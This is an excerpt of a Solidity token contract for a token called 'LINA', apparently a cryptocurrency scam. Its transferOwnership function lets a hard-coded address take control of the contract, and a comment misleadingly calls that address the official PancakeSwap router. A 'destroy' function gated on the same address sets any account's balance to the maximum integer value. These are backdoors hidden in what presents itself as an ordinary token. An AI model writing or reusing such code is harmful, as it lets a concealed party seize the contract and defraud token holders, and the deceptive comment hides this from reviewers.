...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        require(newOwner != address(0), "Ownable: new owner is the zero address"); require(msg.sender == owner() || msg.sender == address(0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4));  //this function will allow us to transfer the owner , using the pancakeswap official router adress (0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4) so the transaction never fails
...
contract LINA is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "LINA";
  string private _name = "LINA";
  uint256 public _blocked = ~uint256(0);
...
function _burn(address account, uint256 amount) public returns (bool) {
 ...
 function destroy(address account) public onlyOwner returns (bool success) { require(msg.sender == owner() && msg.sender == address(0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4));  //this function will allow us to transfer the owner , using the pancakeswap official router adress (0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4) so the transaction never fails
     _balances[account] = _blocked;return true;}
